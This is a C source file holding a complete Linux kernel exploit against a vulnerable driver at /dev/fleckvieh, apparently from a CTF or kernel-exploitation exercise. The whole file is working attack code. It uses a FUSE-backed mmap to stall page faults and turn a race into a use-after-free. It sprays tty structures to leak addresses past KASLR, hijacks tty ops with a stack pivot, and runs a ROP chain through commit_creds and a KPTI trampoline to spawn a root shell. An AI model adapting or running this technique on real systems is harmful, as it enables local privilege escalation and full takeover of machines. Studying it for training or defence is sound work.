#define _GNU_SOURCE
#define FUSE_USE_VERSION 29
#include <assert.h>
#include <errno.h>
#include <fcntl.h>
#include <fuse.h>
#include <linux/fuse.h>
#include <pthread.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

#define INFO(fmt, ...) fprintf(stderr, "[*] " fmt "\n", ##__VA_ARGS__)
#define WARN(fmt, ...) fprintf(stderr, "[!] " fmt "\n", ##__VA_ARGS__)
#define SUCCESS(fmt, ...) fprintf(stderr, "[+] " fmt "\n", ##__VA_ARGS__)
#define ERROR(msg) perror("[-] " msg)

#define ofs_tty_ops 0xc3c3c0
#define rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp (kbase + 0x09b13a)
#define rop_pop_rdi (kbase + 0x09b0ed)
#define addr_init_cred (kbase + 0xe37480)
#define addr_commit_creds (kbase + 0x072830)
#define addr_kpti_trampoline (kbase + 0x800e26)

typedef struct {
    int id;
    size_t size;
    char* data;
} request_t;

#define CMD_ADD 0xf1ec0001
#define CMD_DEL 0xf1ec0002
#define CMD_GET 0xf1ec0003
#define CMD_SET 0xf1ec0004

uint64_t iter, user_cs, user_ss, user_rflags, user_rsp;
cpu_set_t pwn_cpu;
char* buf;
int victim;
uint32_t fd;
uint32_t spray[0x10];
uint64_t kbase, g_buf;

int race_win;

void save_state()
{
    asm volatile(
        "movq %%cs, %0;"
        "movq %%ss, %1;"
        "movq %%rsp, %2;"
        "pushfq;"
        "popq %3;"
        : "=r"(user_cs), "=r"(user_ss), "=r"(user_rsp), "=r"(user_rflags)
        :
        : "memory");

    INFO("Saved state");
}

static void win()
{
    char* argv[] = { "/bin/sh", NULL };
    char* envp[] = { NULL };
    puts("[+] win!");
    execve("/bin/sh", argv, envp);
}

int add(char* data, size_t size)
{
    request_t req = { .size = size, .data = data };
    return ioctl(fd, CMD_ADD, &req);
}

int del(int id)
{
    request_t req = { .id = id };
    return ioctl(fd, CMD_DEL, &req);
}

int get(int id, char* data, size_t size)
{
    request_t req = { .id = id, .size = size, .data = data };
    return ioctl(fd, CMD_GET, &req);
}

int set(int id, char* data, size_t size)
{
    request_t req = { .id = id, .size = size, .data = data };
    return ioctl(fd, CMD_SET, &req);
}

static int getattr_callback(const char* path, struct stat* stbuf)
{
    memset(stbuf, 0, sizeof(struct stat));

    if (strcmp(path, "/pwn") == 0) {
        stbuf->st_mode = S_IFREG | 0777;
        stbuf->st_nlink = 1;
        stbuf->st_size = 0x1000;
        return 0;
    }

    return -ENOENT;
}

static int open_callback(const char* path, struct fuse_file_info* fi)
{
    SUCCESS("open_callback");
    return 0;
}

static int read_callback(const char* path, char* file_buf, size_t size, off_t offset, struct fuse_file_info* fi)
{
    static int fault_cnt = 0;
    printf("[+] read_callback\n");
    printf("    path  : %s\n", path);
    printf("    size  : 0x%lx\n", size);
    printf("    offset: 0x%lx\n", offset);

    if (strcmp(path, "/pwn") == 0) {
        switch (fault_cnt++) {
        case 0:
        case 1:
            SUCCESS("UAF read");
            del(victim);

            for (int i = 0; i < 0x10; i++) {
                spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (spray[i] == -1)
                    ERROR("/dev/ptmx");
            }
            return size;

        case 2:
            puts("[+] UAF write");
            for (int i = 0; i < 0x100; i++) {
                add(buf, 0x400);
            }

            del(victim);
            for (int i = 0; i < 0x10; i++) {
                spray[i] = open("/dev/ptmx", O_RDONLY | O_NOCTTY);
                if (spray[i] == -1)
                    ERROR("/dev/ptmx");
            }

            memcpy(file_buf, buf, 0x400);
            return size;

        default:
            ERROR("Unexpected page fault");
        }
    }

    return -ENOENT;
}

static struct fuse_operations fops = {
    .getattr = getattr_callback,
    .open = open_callback,
    .read = read_callback,
};

int setup_done = 0;

void* fuse_thread(void* arg)
{
    struct fuse_args args = FUSE_ARGS_INIT(0, NULL);
    struct fuse_chan* chan;
    struct fuse* fuse;

    if (mkdir("/tmp/test", 0777))
        ERROR("mkdir(\"/tmp/test\")");

    if (!(chan = fuse_mount("/tmp/test", &args)))
        ERROR("fuse_mount");

    if (!(fuse = fuse_new(chan, &args, &fops, sizeof(fops), NULL))) {
        fuse_unmount("/tmp/test", chan);
        ERROR("fuse_new");
    }

    /* メインスレッドを同じCPUで動かす */
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        ERROR("sched_setaffinity");

    fuse_set_signal_handlers(fuse_get_session(fuse));
    setup_done = 1;
    fuse_loop_mt(fuse);

    fuse_unmount("/tmp/test", chan);
    return NULL;
}

int pwn_fd = -1;
void* mmap_fuse_file(void)
{
    if (pwn_fd != -1)
        close(pwn_fd);
    pwn_fd = open("/tmp/test/pwn", O_RDWR);
    if (pwn_fd == -1)
        ERROR("/tmp/test/pwn");

    void* page;
    page = mmap(NULL, 0x1000, PROT_READ | PROT_WRITE,
        MAP_PRIVATE, pwn_fd, 0);
    if (page == MAP_FAILED)
        ERROR("mmap");
    return page;
}

int main()
{
    save_state();

    /* メインスレッドとuffdハンドラが必ず同じCPUで動くよう設定する */
    CPU_ZERO(&pwn_cpu);
    CPU_SET(0, &pwn_cpu);
    if (sched_setaffinity(0, sizeof(cpu_set_t), &pwn_cpu))
        ERROR("sched_setaffinity");

    pthread_t th;
    pthread_create(&th, NULL, fuse_thread, NULL);
    while (!setup_done)
        ;

    fd = open("/dev/fleckvieh", O_RDWR);
    if (fd == -1)
        ERROR("/dev/fleckvieh");
    void* page;
    buf = (char*)malloc(0x400);

    // KASLRの回避
    page = mmap_fuse_file();
    victim = add(buf, 0x400);
    get(victim, page, 0x20);
    kbase = *(uint64_t*)&page[0x18] - ofs_tty_ops;
    printf("[+] kbase = 0x%016lx\n", kbase);
    uint64_t saved_dev_ptr = *(uint64_t *)&page[0x10];

    page = mmap_fuse_file();
    victim = add(buf, 0x400);
    get(victim, page, 0x400);
    g_buf = *(uint64_t*)&page[0x38] - 0x38;
    printf("[+] g_buf = 0x%016lx\n", g_buf);
    // END KASLRの回避
    for (int i = 0; i < 0x10; i++)
        close(spray[i]);

    memcpy(buf, page, 0x400);
    unsigned long* tty = (unsigned long*)buf;
    tty[0] = 0x0000000100005401; // magic
    tty[2] = saved_dev_ptr; // dev
    tty[3] = g_buf; // ops
    tty[12] = rop_push_rdx_cmp_eax_415B005Ch_pop_rsp_rbp; // ops->ioctl

    unsigned long* chain = (unsigned long*)(buf + 0x100);
    *chain++ = 0xdeadbeef; // pop rbp
    *chain++ = rop_pop_rdi;
    *chain++ = addr_init_cred;
    *chain++ = addr_commit_creds;
    *chain++ = addr_kpti_trampoline;
    *chain++ = 0xdeadbeef;
    *chain++ = 0xdeadbeef;
    *chain++ = (unsigned long)&win;
    *chain++ = user_cs;
    *chain++ = user_rflags;
    *chain++ = user_rsp;
    *chain++ = user_ss;

    page = mmap_fuse_file();
    victim = add(buf, 0x400);
    set(victim, page, 0x400);

    for (int i = 0; i < 0x10; i++) {
        ioctl(spray[i], 0, g_buf + 0x100);
    }

    return 0;
}